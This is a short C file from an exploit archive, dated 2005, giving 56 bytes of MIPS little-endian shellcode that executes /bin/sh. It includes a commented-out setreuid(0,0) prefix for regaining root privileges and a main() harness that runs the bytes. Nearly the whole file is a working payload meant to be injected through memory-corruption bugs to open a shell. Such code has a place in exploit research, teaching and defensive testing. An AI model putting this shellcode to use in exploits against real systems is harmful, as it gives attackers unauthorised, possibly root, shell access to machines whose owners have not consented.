/* 56 bytes execve /bin/sh shellcode - linux-mipsel
 * - by core (core@bokeoa.com)
 *
 * Note: For MIPS running in little-endian mode.
 * Tested on a Cobalt Qube2 server running Linux 2.4.18
 *
 * Greetz to bighawk... i couldn't get his execve to work
 * for some reason :/
 */

char code[] =
/* 16 byte setreuid(0,0) by bighawk */
//"\xff\xff\x04\x30\xff\xff\x05\x30"
//"\xe6\x0f\x02\x34\xcc\x48\x49\x03"

/* 56 byte execve("/bin/sh",["/bin/sh"],[]) by core */
"\xff\xff\x10\x04\xab\x0f\x02\x24"
"\x55\xf0\x46\x20\x66\x06\xff\x23"
"\xc2\xf9\xec\x23\x66\x06\xbd\x23"
"\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf"
"\x9a\xf9\xbd\x23\x21\x20\x80\x01"
"\x21\x28\xa0\x03\xcc\xcd\x44\x03"
"/bin/sh";

main() {
  void (*a)() = (void *)code;
  printf("size: %d bytes\n", sizeof(code));
  a();
}

// milw0rm.com [2005-11-09]